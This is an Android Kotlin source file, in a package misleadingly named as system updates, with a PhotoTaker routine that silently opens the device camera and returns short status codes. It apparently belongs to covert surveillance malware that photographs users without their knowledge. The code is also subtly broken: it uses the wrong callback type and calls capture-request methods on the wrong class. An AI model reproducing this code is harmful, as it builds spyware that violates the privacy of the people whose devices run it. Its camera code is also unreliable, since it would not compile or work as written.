package com.system.updates.modules

import android.content.Context
import android.hardware.camera2.CameraManager
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.util.Base64
import java.io.ByteArrayOutputStream

object PhotoTaker {
    fun takePhoto(ctx: Context): String {
        return try {
            val cm = ctx.getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val cl = cm.cameraIdList
            if (cl.isEmpty()) return "ERR_NO_CAM"
            val ci = cl[0]
            val ht = HandlerThread("CamThr").apply { start() }
            val ir = ImageReader.newInstance(640, 480, android.graphics.ImageFormat.JPEG, 2)
            cm.openCamera(ci, object : CameraManager.AvailabilityCallback() {
                override fun onCameraOpened(cid: String) {
                    val cr = cm.createCaptureRequest(CameraManager.TEMPLATE_STILL_CAPTURE)
                    cr.addTarget(ir.surface)
                }
            }, Handler(ht.looper))
            "CAM_OK"
        } catch (e: SecurityException) {
            "ERR_PERM"
        } catch (e: Exception) {
            "ERR_CAM"
        }
    }
}